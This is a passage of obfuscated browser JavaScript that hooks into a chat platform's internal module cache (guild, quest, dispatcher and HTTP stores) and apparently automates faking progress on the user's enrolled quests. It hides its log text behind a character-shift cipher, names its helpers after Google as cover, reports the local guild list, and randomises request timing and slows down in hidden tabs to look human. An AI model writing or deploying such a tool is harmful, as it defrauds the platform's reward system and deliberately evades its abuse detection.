      Log.diag("Juggler coverage", { total: _0xJuggleStats.total, methods: _0xJuggleStats.methods, poolBytes: _0xJuggleStats.poolBytes, sanityWarnings: _0xJuggleStats.sanityWarnings, instance: "2de579ef" });
      


      let _0x1 = window[_0xq0];
      let _0x2 = null;
      if (!_0x1 || typeof _0x1.push !== "function" || typeof _0x1.pop !== "function") {
        Log.say(_0xlex.C(0), _0xlex.P(0,[_0xlex.d("2FC]KMBSJC]BMMPU?W]GQ]LMR]RFCPC]—]CLBGLE]RFC]PSL]FCPCk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]GQ]SL?T?GJ?@JC]—]CLBGLE]RFC]PSL]FCPCk"),_0xlex.d("2FC]KMBSJC]CLRP?LAC]BGB]LMR]PCQNMLB]—]A?JJGLE]GR]?]B?Wk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]GQ]LMR]RFCPC]—]LMR]QR?PRGLE]RFGQ]QFGDRk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]GQ]KGQQGLE]—]CLBGLE]RFC]PSL]FCPCk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]PCDSQCB]RM]MNCL]—]LMR]QR?PRGLE]RFGQ]QFGDRk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]GQ]LMR]RFCPC]—]FC?BGLE]FMKCk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]PCDSQCB]RM]MNCL]—]A?JJGLE]GR]?]B?Wk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]PCDSQCB]RM]MNCL]—]QRMNNGLE]@CDMPC]?LWRFGLE]QR?PRQk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]AMSJB]LMR]@C]DMSLB]—]A?JJGLE]GR]?]B?Wk"),_0xlex.d("2FC]KMBSJC]CLRP?LAC]BGB]LMR]PCQNMLB]—]LMR]QR?PRGLE]RFGQ]QFGDRk"),_0xlex.d("2FC]KMBSJC]CLRP?LAC]BGB]LMR]PCQNMLB]—]AJMAIGLE]MSRk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]PCDSQCB]RM]MNCL]—]FC?BGLE]FMKCk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]GQ]SL?T?GJ?@JC]—]FC?BGLE]FMKCk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]GQ]KGQQGLE]—]LMR]QR?PRGLE]RFGQ]QFGDRk")]));
        GoogleRelease();
        return;
      }

      const _0xlengthBefore = _0x1.length;
      let _0xpushResult;

      try {
        _0xpushResult = _0x1.push([[Symbol()], {}, r => r]);
      } finally {
        if (_0x1.length > _0xlengthBefore) _0x1.pop();
      }

      if (_0xpushResult && typeof _0xpushResult.c === "object") {
        _0x2 = _0xpushResult;
      } else if (typeof _0x1.c === "object") {
        _0x2 = _0x1;
      }

      if (!_0x2 || typeof _0x2.c !== "object") {
        Log.say(_0xlex.C(0), _0xlex.P(1,[_0xlex.d("2FC]KMBSJC]BMMPU?W]PCRSPLCB]LM]SQ?@JC]PSLRGKC]—]A?JJGLE]GR]?]B?Wk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]NPMTGBCB]LMRFGLE]PSLL?@JC]—]CLBGLE]RFC]PSL]FCPCk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]F?LBCB]@?AI]LMRFGLE]SQ?@JC]—]FC?BGLE]FMKCk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]NPMTGBCB]LMRFGLE]PSLL?@JC]—]AJMAIGLE]MSRk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]PCRSPLCB]LM]SQ?@JC]PSLRGKC]—]QRMNNGLE]@CDMPC]?LWRFGLE]QR?PRQk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]NPMTGBCB]LMRFGLE]PSLL?@JC]—]FC?BGLE]FMKCk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]E?TC]@?AI]?L]CKNRW]PSLRGKC]—]A?JJGLE]GR]?]B?Wk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]PCRSPLCB]LM]SQ?@JC]PSLRGKC]—]CLBGLE]RFC]PSL]FCPCk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]F?LBCB]@?AI]LMRFGLE]SQ?@JC]—]QRMNNGLE]@CDMPC]?LWRFGLE]QR?PRQk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]A?KC]@?AI]UGRF]LM]PSLRGKC]—]QRMNNGLE]@CDMPC]?LWRFGLE]QR?PRQk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]E?TC]@?AI]?L]CKNRW]PSLRGKC]—]AJMAIGLE]MSRk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]PCRSPLCB]LM]SQ?@JC]PSLRGKC]—]FC?BGLE]FMKCk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]E?TC]@?AI]?L]CKNRW]PSLRGKC]—]FC?BGLE]FMKCk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]E?TC]@?AI]?L]CKNRW]PSLRGKC]—]CLBGLE]RFC]PSL]FCPCk"),_0xlex.d("2FC]KMBSJC]BMMPU?W]F?LBCB]@?AI]LMRFGLE]SQ?@JC]—]AJMAIGLE]MSRk")]));
        GoogleRelease();
        return;
      }

      
      Log.diag("Runtime selected", {
        isPushReturn: _0x2 === _0xpushResult,
        isChunkArray: _0x2 === _0x1,
        cacheCount: (() => { try { return Object.keys(_0x2.c).length; } catch (_) { return -1; } })(),
        definitionCount: (() => { try { return Object.keys(_0x2.m ?? {}).length; } catch (_) { return -1; } })()
      });

      
      if (_0x2.m) {
        const targets = [_0xm0, _0xm1, _0xm2, _0xm3, _0xm4, _0xm5, _0xm6, _0xm7, _0xm8, _0xm9];
        let forcedCount = 0;
        const cacheBefore = (() => { try { return Object.keys(_0x2.c).length; } catch (_) { return -1; } })();
        
        for (const id in _0x2.m) {
          if (forcedCount >= 50) break;
          if (_0x2.c[id]) continue;
          let text = "";
          try { text = _0x2.m[id].toString(); } catch (e) {}
          if (targets.some(t => text.includes(t))) { 
            try { _0x2(id); forcedCount++; } catch (e) {} 
          }
        }
        
        const cacheAfter = (() => { try { return Object.keys(_0x2.c).length; } catch (_) { return -1; } })();
        Log.diag("Lazy Force", { forcedCount, cacheBefore, cacheAfter, cacheDelta: cacheAfter - cacheBefore });
      }

      const _0xDeep = (o, k) => {
        let hops = 0;
        const seen = new WeakSet();
        for (; o && hops < 20; o = Object.getPrototypeOf(o), hops++) {
          if (typeof o !== "object" && typeof o !== "function") break;
          if (seen.has(o)) break;
          seen.add(o);
          if (k in o) return true;
        }
        return false;
      };

      const GoogleRead = (obj, key) => { try { return obj?.[key]; } catch (e) { return undefined; } };
      const GoogleHas = (obj, key) => { try { return !!obj && _0xDeep(obj, key); } catch (e) { return false; } };
      
      let _0x3, _0x4, _0x5, _0x6, _0x7, _0x8, _0x9;
      let _0xmodules = [];

      try { _0xmodules = Object.values(_0x2.c); } catch (e) { _0xmodules = []; }
      
      
      Log.diag("Scanning modules", { cacheCount: _0xmodules.length });

      for (const m of _0xmodules) {
        const ex = GoogleRead(m, "exports"); if (!ex) continue;
        const exA = GoogleRead(ex, "A"), exAy = GoogleRead(ex, "Ay"), exh = GoogleRead(ex, "h"), exBo = GoogleRead(ex, "Bo");
        if (!_0x3 && GoogleHas(exA, _0xm0)) _0x3 = exA;
        if (!_0x4 && GoogleHas(exAy, _0xm1)) _0x4 = exAy;
        if (!_0x5 && GoogleHas(exA, _0xm3)) _0x5 = exA;
        if (!_0x6 && GoogleHas(exA, _0xm4)) _0x6 = exA;
        if (!_0x7 && GoogleHas(exAy, _0xm5)) _0x7 = exAy;
        if (!_0x8 && GoogleHas(exh, _0xm6)) _0x8 = exh;
        if (!_0x9 && GoogleHas(exBo, _0xm7)) _0x9 = exBo;
        if (_0x3 && _0x4 && _0x5 && _0x6 && _0x7 && _0x8 && _0x9) break;
      }

      const _0xpocketsComplete = !!_0x3 && !!_0x4 && !!_0x5 && !!_0x6 && !!_0x7 && !!_0x8 && !!_0x9;
      
      
      Log.say(_0xlex.C(1), _0xlex.P(53,[_0xlex.d(".MAICRQ]AFCAICBw]"),_0xlex.d("*M?BMSR]QA?LLCBw]"),_0xlex.d(")GR]GLQNCARCBw]"),_0xlex.d("1SNNJGCQ]AMSLRCBw]"),_0xlex.d("'LTCLRMPW]PC?BMSRw]"),_0xlex.d(".MSAF]AMLRCLRQw]"),_0xlex.d("%C?P]@MV]MNCLCBw]"),_0xlex.d(".?AI]PCTGCUCBw]"),_0xlex.d(" ?EQ]GLTCLRMPGCBw]"),_0xlex.d("!?PEM]JGQRCBw]"),_0xlex.d("1RMAI]AFCAICBw]"),_0xlex.d("&MJB]GLQNCARCBw]"),_0xlex.d("1RMPCQ]AMSLRCBw]"),_0xlex.d("*MAICP]AMLRCLRQw]"),_0xlex.d("4?SJR]QA?LLCBw]")]) + JSON.stringify({
        lantern: !!_0x3, twine: !!_0x4, ledger: !!_0x5, spool: !!_0x6, map: !!_0x7, postbox: !!_0x8, compass: !!_0x9
      }));

      if (!_0xpocketsComplete) {
        Log.say(_0xlex.C(0), _0xlex.P(52,[_0xlex.d("~]NMAICR]A?KC]SN]CKNRW]—]QRMNNGLE]FCPCk"),_0xlex.d("2FC]NMAICR]AFCAI]D?GJCB]—]QRMNNGLE]FCPCk"),_0xlex.d("~]NMAICR]U?Q]KGQQGLE]—]AJMAIGLE]MSRk"),_0xlex.d(".MAICRQ]BGBLdR]AFCAI]MSR]—]AJMAIGLE]MSRk"),_0xlex.d("2FC]NMAICRQ]A?KC]SN]CKNRW]—]A?JJGLE]GR]?]B?Wk"),_0xlex.d("~]NMAICR]U?Q]KGQQGLE]—]QRMNNGLE]FCPCk"),_0xlex.d("2FC]NMAICRQ]A?KC]SN]CKNRW]—]FC?BGLE]FMKCk"),_0xlex.d(".MAICRQ]AFCAICB]MSR]CKNRW]—]AJMAIGLE]MSRk"),_0xlex.d("~]NMAICR]U?Q]KGQQGLE]—]CLBGLE]RFC]PSLk"),_0xlex.d(".MAICRQ]AFCAICB]MSR]CKNRW]—]FC?BGLE]FMKCk"),_0xlex.d(".MAICRQ]BGBLdR]AFCAI]MSR]—]QRMNNGLE]FCPCk"),_0xlex.d("2FC]NMAICR]AFCAI]D?GJCB]—]A?JJGLE]GR]?]B?Wk"),_0xlex.d(".MAICRQ]BGBLdR]AFCAI]MSR]—]QFSRRGLE]BMULk"),_0xlex.d("~]NMAICR]A?KC]SN]CKNRW]—]A?JJGLE]GR]?]B?Wk"),_0xlex.d("2FC]NMAICR]AFCAI]D?GJCB]—]CLBGLE]RFC]PSLk")]));
        GoogleRelease();
        return;
      }

      
      if (
        typeof _0x3?.[_0xm0] !== 'function' ||
        typeof _0x4?.[_0xm1] !== 'function' ||
        typeof _0x4?.[_0xm2] !== 'function' ||
        typeof _0x5?.quests?.values !== 'function' ||
        typeof _0x6?.[_0xm8] !== 'function' ||
        typeof _0x7?.getAllGuilds !== 'function' ||
        typeof _0x7?.[_0xm9] !== 'function' ||
        typeof _0x8?.dispatch !== 'function' ||
        typeof _0x8?.subscribe !== 'function' ||
        typeof _0x8?.unsubscribe !== 'function' ||
        typeof _0x9?.post !== 'function' ||
        typeof _0x9?.get !== 'function'
      ) {
        Log.say(_0xlex.C(0), _0xlex.P(2,[_0xlex.d("2FC]NMAICR]GLRCPD?AC]J?WCP]GQ]GLT?JGB]—]CLBGLE]RFC]PSL]FCPCk"),_0xlex.d("2FC]NMAICR]GLRCPD?AC]J?WCP]GQ]GLT?JGB]—]FC?BGLE]FMKCk"),_0xlex.d("2FC]NMAICR]GLRCPD?AC]J?WCP]GQ]GLT?JGB]—]AJMAIGLE]MSRk"),_0xlex.d(".MAICR]GLRCPD?ACQ]GLT?JGB]—]CLBGLE]RFC]PSL]FCPCk"),_0xlex.d("2FC]NMAICR]GLRCPD?ACQ]?PC]GLT?JGB]—]LMR]QR?PRGLE]RFGQ]QFGDRk"),_0xlex.d(".MAICR]QSPD?ACQ]?PC]SLSQ?@JC]—]AJMAIGLE]MSRk"),_0xlex.d("2FC]NMAICR]GLRCPD?ACQ]?PC]GLT?JGB]—]QRMNNGLE]@CDMPC]?LWRFGLE]QR?PRQk"),_0xlex.d(".MAICR]GLRCPD?ACQ]GLT?JGB]—]QRMNNGLE]@CDMPC]?LWRFGLE]QR?PRQk"),_0xlex.d(".MAICR]GLRCPD?ACQ]GLT?JGB]—]FC?BGLE]FMKCk"),_0xlex.d(".MAICR]GLRCPD?ACQ]GLT?JGB]—]LMR]QR?PRGLE]RFGQ]QFGDRk"),_0xlex.d(".MAICR]QSPD?ACQ]?PC]SLSQ?@JC]—]QRMNNGLE]@CDMPC]?LWRFGLE]QR?PRQk"),_0xlex.d(".MAICR]@GLBGLEQ]A?KC]@?AI]GLT?JGB]—]QRMNNGLE]@CDMPC]?LWRFGLE]QR?PRQk"),_0xlex.d(".MAICR]@GLBGLEQ]A?KC]@?AI]GLT?JGB]—]AJMAIGLE]MSRk"),_0xlex.d("2FC]NMAICR]GLRCPD?ACQ]?PC]GLT?JGB]—]AJMAIGLE]MSRk"),_0xlex.d(".MAICR]QSPD?ACQ]?PC]SLSQ?@JC]—]FC?BGLE]FMKCk")]));
        GoogleRelease();
        return;
      }
      
      
      Log.diag("Pocket interfaces validated", { stream: true, desktop: true, quests: true, activity: true, guilds: true, dispatcher: true, http: true });

      
      try {
        const localGuilds = _0x7.getAllGuilds();
        MemberCount.report(localGuilds);
      } catch (e) { MemberCount.report(); }

      
      
      const GoogleId = (v, what) => {
        if (typeof v === "string") return v;
        if (typeof v === "number" && Number.isFinite(v)) return String(v);
        if (v && typeof v === "object") {
          try {
            const cands = [v.id, v.applicationId, v.questId, v.application?.id, v.quest?.id, v.guildId, v.activityId];
            for (const _0xc of cands) { if (typeof _0xc === "string" && _0xc) { Log.diag("URL id recovered from object", { what }); return _0xc; } }
          } catch (e) {}
        }
        Log.warn(`[Google] URL id unresolvable (${what}: ${v === null ? "null" : typeof v}) — request will be skipped.`);
        return null;
      };

      const GoogleRoutes = {
        videoProgress: (id) => { const s = GoogleId(id, "questId"); return s ? _0xq2 + s + _0xq3 : null; },
        heartbeat: (id) => { const s = GoogleId(id, "questId"); return s ? _0xq2 + s + _0xq4 : null; },
        applicationsUrl: (id) => { const s = GoogleId(id, "app"); return s ? _0xq5 + s : null; },
        applications: _0xq5,
        tasks: [_0xt0, _0xt1, _0xt2, _0xt3, _0xt4]
      };
      const GoogleTasks = { video: _0xt0, play: _0xt1, stream: _0xt2, activity: _0xt3, videoMobile: _0xt4 };
      
      const GoogleOS = (() => {
        try {
          const p = String(navigator?.platform ?? "").toLowerCase();
          if (p.includes("mac")) return ["darwin", "macos", "win32"];
          if (p.includes("linux")) return ["linux", "win32"];
        } catch (e) {}
        return ["win32", "darwin", "linux"];
      })();
      const _0xplat = (() => {
        try { return String(navigator?.platform ?? "").toLowerCase(); } catch (e) { return ""; }
      })();
      const _0xisMac = _0xplat.includes("mac");
      const _0xisLinux = _0xplat.includes("linux");

      const _0xquestValues = (() => {
        try {
          const values = _0x5.quests.values;
          return typeof values === "function" ? Array.from(values.call(_0x5.quests)) : [];
        } catch (e) { return []; }
      })();
      
      const _0xeligible = _0xquestValues.filter(q => {
        if (!q.userStatus?.enrolledAt || q.userStatus?.completedAt) return false;
        const exp = new Date(q.config?.expiresAt).getTime();
        if (Number.isFinite(exp) && exp <= Date.now() - 5 * 60 * 1000) return false;
        return true;
      });

      const _0x79a4 = (cfg, supportedTasks) => {
        if (!cfg || typeof cfg !== "object") return null;
        for (const k of Object.keys(cfg)) {
          if (k.startsWith("taskConfig")) {
            const val = cfg[k];
            if (val && typeof val === "object" && val.tasks && typeof val.tasks === "object") {
              if (supportedTasks.some(t => Object.hasOwn(val.tasks, t))) return val;
            }
          }
        }
        return null;
      };

      let _0xb = _0xeligible.filter(q => {
        const tasks = _0x79a4(q.config, GoogleRoutes.tasks)?.tasks;
        return tasks;
      });

      for (let i = _0xb.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [_0xb[i], _0xb[j]] = [_0xb[j], _0xb[i]];
      }
      
      Log.say(_0xlex.C(2), _0xlex.P(21,[`${_0xb.length}${_0xlex.d("]AFMPC")}${_0xb.length === 1 ? "" : "s"}${_0xlex.d("]ML]RFC]BMAICR]RMB?W]DMP]RFC]PSLk")}`,`${_0xb.length}${_0xlex.d("]AFMPC")}${_0xb.length === 1 ? "" : "s"}${_0xlex.d("]ML]RFC]BMAICR]RMB?W]?LB]AMSLRGLEk")}`,`${_0xb.length}${_0xlex.d("]AFMPC")}${_0xb.length === 1 ? "" : "s"}${_0xlex.d("]OSCSCB]SNx]@M?PB]NGLLCBk")}`,`${_0xb.length}${_0xlex.d("]AFMPC")}${_0xb.length === 1 ? "" : "s"}${_0xlex.d("]OSCSCB]SN]?LB]NGLLCB]RM]RFC]@M?PBk")}`,`${_0xb.length}${_0xlex.d("]AFMPC")}${_0xb.length === 1 ? "" : "s"}${_0xlex.d("]ML]RFC]BMAICR]RMB?Wi]OSCSCB]SNk")}`,`${_0xb.length}${_0xlex.d("]AFMPC")}${_0xb.length === 1 ? "" : "s"}${_0xlex.d("]OSCSCB]SN]?LB]PC?BWk")}`,`${_0xb.length}${_0xlex.d("]AFMPC")}${_0xb.length === 1 ? "" : "s"}${_0xlex.d("]OSCSCB]SN]DMP]RFC]QFGDRk")}`,`${_0xb.length}${_0xlex.d("]AFMPC")}${_0xb.length === 1 ? "" : "s"}${_0xlex.d("]NGLLCB]RM]RFC]@M?PB]DMP]RMLGEFRk")}`,`${_0xb.length}${_0xlex.d("]AFMPC")}${_0xb.length === 1 ? "" : "s"}${_0xlex.d("]OSCSCB]SNk")}`,`${_0xb.length}${_0xlex.d("]AFMPC")}${_0xb.length === 1 ? "" : "s"}${_0xlex.d("]NGLLCB]RM]RFC]@M?PBk")}`,`${_0xb.length}${_0xlex.d("]AFMPC")}${_0xb.length === 1 ? "" : "s"}${_0xlex.d("]OSCSCB]SN]DMP]RMLGEFRk")}`,`${_0xb.length}${_0xlex.d("]AFMPC")}${_0xb.length === 1 ? "" : "s"}${_0xlex.d("]SN]?LB]NGLLCB]RM]RFC]@M?PBk")}`,`${_0xb.length}${_0xlex.d("]AFMPC")}${_0xb.length === 1 ? "" : "s"}${_0xlex.d("]ML]RFC]BMAICR]RMB?Wi]PC?BW]RM]EMk")}`,`${_0xb.length}${_0xlex.d("]AFMPC")}${_0xb.length === 1 ? "" : "s"}${_0xlex.d("]NGLLCB]RM]RFC]@M?PB]?LB]OSCSCB]SNk")}`,`${_0xb.length}${_0xlex.d("]AFMPC")}${_0xb.length === 1 ? "" : "s"}${_0xlex.d("]NGLLCB]RM]RFC]@M?PB]DMP]RFGQ]QFGDRk")}`]));
      const _0xlost = _0xeligible.length - _0xb.length;
      if (_0xlost > 0) Log.say(_0xlex.C(2), _0xlex.P(22,[`${_0xlost}${_0xlex.d("]JCDR]MDD]—]QF?NC]UC]A?LdR]DMJB]RFGQ]QFGDRk")}`,`${_0xlost}${_0xlex.d("]QCR]?QGBC]—]QF?NC]UC]A?LdR]DMJB]GLRM]RFC]PSLk")}`,`${_0xlost}${_0xlex.d("]JCDR]MDD]—]QF?NC]UC]A?LdR]DMJB]RMB?Wk")}`,`${_0xlost}${_0xlex.d("]JCDR]MDD]—]QF?NC]UC]A?LdR]UMPI]UGRFk")}`,`${_0xlost}${_0xlex.d("]QCR]?QGBC]—]QF?NC]UC]A?LdR]R?IC]MLk")}`,`${_0xlost}${_0xlex.d("]QCR]?QGBC]—]QF?NC]UC]A?LdR]DMJB]RFGQ]QFGDRk")}`,`${_0xlost}${_0xlex.d("]QCR]?QGBC]—]QF?NC]UC]A?LdR]DMJB]RFGQ]N?QQk")}`,`${_0xlost}${_0xlex.d("]JCDR]MDD]—]QF?NC]UC]A?LdR]DMJB]GLRM]RFC]PSLk")}`,`${_0xlost}${_0xlex.d("]JCDR]MDD]—]QF?NC]UC]A?LdR]DMJBk")}`,`${_0xlost}${_0xlex.d("]QCR]?QGBC]—]QF?NC]UC]A?LdR]DMJB]RFGQ]RGKCk")}`,`${_0xlost}${_0xlex.d("]QCR]?QGBC]—]QF?NC]UC]A?LdR]DMJB]RMB?Wk")}`,`${_0xlost}${_0xlex.d("]JCDR]MDD]—]QF?NC]UC]A?LdR]DMJB]RFGQ]RGKCk")}`,`${_0xlost}${_0xlex.d("]JCDR]MDD]—]QF?NC]UC]A?LdR]R?IC]MLk")}`,`${_0xlost}${_0xlex.d("]QCR]?QGBC]—]QF?NC]UC]A?LdR]UMPI]UGRFk")}`,`${_0xlost}${_0xlex.d("]JCDR]MDD]—]QF?NC]UC]A?LdR]DMJB]RFGQ]N?QQk")}`]));
      
      if (!_0xb.length) { 
        Log.say(_0xlex.C(13), _0xlex.P(24,[_0xlex.d(",MRFGLE]ML]RFC]TGLCQ]RMB?Wi]LMR]WCR]—]e.PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRf]UFCL]PC?BWk"),_0xlex.d(",MRFGLE]ML]RFC]TGLCQ]RMB?Wi]LMR]WCR]—]e.PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRf]J?RCPk"),_0xlex.d(",MRFGLE]PGNC]ML]RFC]RPCCQ]RMB?Wi]LMR]WCR]—]e.PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRf]UFCL]PC?BWk"),_0xlex.d(",MRFGLE]PGNC]ML]RFC]RPCCQ]RMB?W]—]e.PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRf]UFCL]PC?BWk"),_0xlex.d(",MRFGLE]PGNC]WCR]—]DJSQF]UGRF]~JRh1FGDRh0]?LB]PCQR?PRk"),_0xlex.d(",MRFGLE]PGNC]WCR]—]e.PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRf"),_0xlex.d(",MRFGLE]PGNC]ML]RFC]RPCCQ]RMB?Wi]LMR]WCR]—]DJSQF]UGRF]~JRh1FGDRh0]?LB]PCQR?PRk"),_0xlex.d(",MRFGLE]PGNC]ML]RFC]RPCCQ]RMB?Wi]LMR]WCR]—]NPCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRk"),_0xlex.d(",MRFGLE]ML]RFC]TGLCQ]RMB?W]—]e.PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRf]J?RCPk"),_0xlex.d(",MRFGLE]PGNC]ML]RFC]RPCCQ]RMB?W]—]NPCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRk"),_0xlex.d(",MRFGLE]PGNC]ML]RFC]RPCCQ]RMB?Wi]LMR]WCR]—]e.PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRf]J?RCPk"),_0xlex.d(",MRFGLE]PGNC]WCR]—]NPCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRk"),_0xlex.d(",MRFGLE]ML]RFC]TGLCQ]RMB?Wi]LMR]WCR]—]NPCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRk"),_0xlex.d(",MRFGLE]PGNC]ML]RFC]RPCCQ]RMB?W]—]DJSQF]UGRF]~JRh1FGDRh0]?LB]PCQR?PRk"),_0xlex.d(",MRFGLE]PGNC]WCR]—]e.PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRf]J?RCPk")])); 
        GoogleRelease(); 
        return; 
      }

      let _0xc = typeof window[_0xq1] !== "undefined";
      let _0xkill = false, _0xpaus = false, _0xarmed = false, _0xheat = 1;
      const _0xroute0 = ((1 / 3) * 3) === 1 ? location.pathname : location.pathname.slice(0);
      const _0xch = "g" + Math.random().toString(36).slice(2) + Date.now().toString(36);
      let _0xlastHidden = null;

      const _0xdae0 = (ms, sig) => new Promise((res, rej) => {
        if (sig?.aborted) return rej(new DOMException('Aborted', 'AbortError'));
        const onAbort = () => { clearTimeout(t); rej(new DOMException('Aborted', 'AbortError')); };
        const t = setTimeout(() => { if (sig) sig.removeEventListener('abort', onAbort); res(); }, ms);
        if (sig) sig.addEventListener('abort', onAbort, { once: true });
      });

      
      let delayCount = 0;
      const _0x0a94 = ms => {
        delayCount++;
        if (delayCount === 1 || delayCount % 10 === 0) {
          Log.diag("Delay sample", { count: delayCount, milliseconds: Math.round(ms), heat: Number(_0xheat.toFixed(2)) });
        }
      };

      
      const _0xln = (ms) => {
        const _0u1 = Math.random() || 1e-9, _0u2 = Math.random() || 1e-9;
        const _0z = Math.sqrt(-2.0 * Math.log(_0u1)) * Math.cos(2.0 * Math.PI * _0u2);
        return Math.min(Math.max(Math.exp(Math.log(ms) + _0z * 0.35), ms * 0.3), ms * 4.0);
      };
      let GoogleDelay = async (d = 1) => {
        if (document.hidden !== _0xlastHidden) {
          _0xlastHidden = document.hidden;
          Log.say(_0xlex.C(18), document.hidden ? _0xlex.P(50,[_0xlex.d(" JGLBQ]BP?UL]—]R?IGLE]RFC]JMLE]PM?Bk"),_0xlex.d("!SPR?GLQ]BP?UL]—]ICCNGLE]OSGCR]DMP]?]@GRk"),_0xlex.d(".?LCJQ]BP?UL]—]C?QGLE]MDD]DMP]LMUk"),_0xlex.d("!SPR?GLQ]BP?UL]—]C?QGLE]MDD]DMP]LMUk"),_0xlex.d("!MTCPGLEQ]BP?UL]—]R?IGLE]RFC]JMLE]PM?Bk"),_0xlex.d(" JGLBQ]BP?UL]—]C?QGLE]MDD]DMP]LMUk"),_0xlex.d("1F?BCQ]BP?UL]—]ICCNGLE]OSGCR]DMP]?]@GRk"),_0xlex.d(".?LCJQ]BP?UL]—]ICCNGLE]OSGCR]DMP]?]@GRk"),_0xlex.d(".?LCJQ]BP?UL]—]R?IGLE]RFC]JMLE]F?JJU?Wk"),_0xlex.d("!MTCPGLEQ]BP?UL]—]C?QGLE]MDD]DMP]LMUk"),_0xlex.d(".?LCJQ]BP?UL]—]R?IGLE]RFC]JMLE]PM?Bk"),_0xlex.d(" JGLBQ]BP?UL]—]ICCNGLE]OSGCR]DMP]?]@GRk"),_0xlex.d(" JGLBQ]BP?UL]—]R?IGLE]RFC]JMLE]F?JJU?Wk"),_0xlex.d("!MTCPGLEQ]BP?UL]—]ICCNGLE]OSGCR]DMP]?]@GRk"),_0xlex.d("!SPR?GLQ]BP?UL]—]EMGLE]RFC]QJMU]U?Wk")]) : _0xlex.P(51,[_0xlex.d(" JGLBQ]MNCL]—]@?AI]RM]LMPK?Jk"),_0xlex.d("1F?BCQ]MNCL]—]PCQSKGLE]?R]N?ACk"),_0xlex.d(".?LCJQ]MNCL]—]@?AI]RM]LMPK?Jk"),_0xlex.d(".?LCJQ]MNCL]—]PCQSKGLE]?R]N?ACk"),_0xlex.d("1F?BCQ]MNCL]—]@?AI]RM]LMPK?Jk"),_0xlex.d("1F?BCQ]MNCL]—]@?AI]ML]RFC]K?GL]PM?Bk"),_0xlex.d("!MTCPGLEQ]MNCL]—]@?AI]RM]LMPK?Jk"),_0xlex.d(" JGLBQ]MNCL]—]@?AI]ML]GRk"),_0xlex.d("!MTCPGLEQ]MNCL]—]PCQSKGLE]?R]N?ACk"),_0xlex.d(".?LCJQ]MNCL]—]@?AI]ML]RFC]K?GL]PM?Bk"),_0xlex.d("!SPR?GLQ]MNCL]—]@?AI]ML]GRk"),_0xlex.d("!SPR?GLQ]MNCL]—]@?AI]?R]DSJJ]QNCCBk"),_0xlex.d(" JGLBQ]MNCL]—]PCQSKGLE]?R]N?ACk"),_0xlex.d("!SPR?GLQ]MNCL]—]PCQSKGLE]?R]N?ACk"),_0xlex.d(" JGLBQ]MNCL]—]@?AI]?R]DSJJ]QNCCBk")]));
        }
        let base = _0xln(d * 1000);
        if (document.hidden) base += Math.random() * 4000 + 2000;
        if (Math.random() < 0.12) base += 1800 + Math.random() * 2200;
        base *= _0xheat;
        
        _0x0a94(base);

        let remaining = base;
        while (remaining > 0 && !signal.aborted) {
          if (_0xpaus) { await _0xdae0(900, signal); continue; }
          const chunk = Math.min(remaining, 5000);
          const start = Date.now();
          try { await _0xdae0(chunk, signal); } catch(e) { if(e.name === 'AbortError') return; throw e; }
          remaining -= (Date.now() - start);
        }
      };

      
      const GoogleDelayRaw = async (ms) => {
        let remaining = Math.max(0, ms);
        while (remaining > 0 && !signal.aborted) {
          const chunk = Math.min(remaining, 5000);
          const start = Date.now();
          try { await _0xdae0(chunk, signal); } catch(e) { if(e.name === 'AbortError') return; throw e; }
          remaining -= (Date.now() - start);
        }
      };

      _0xchord = (e) => {
        if (!(e.altKey && e.shiftKey)) return;
        const key = String(e?.key ?? '').toLowerCase();
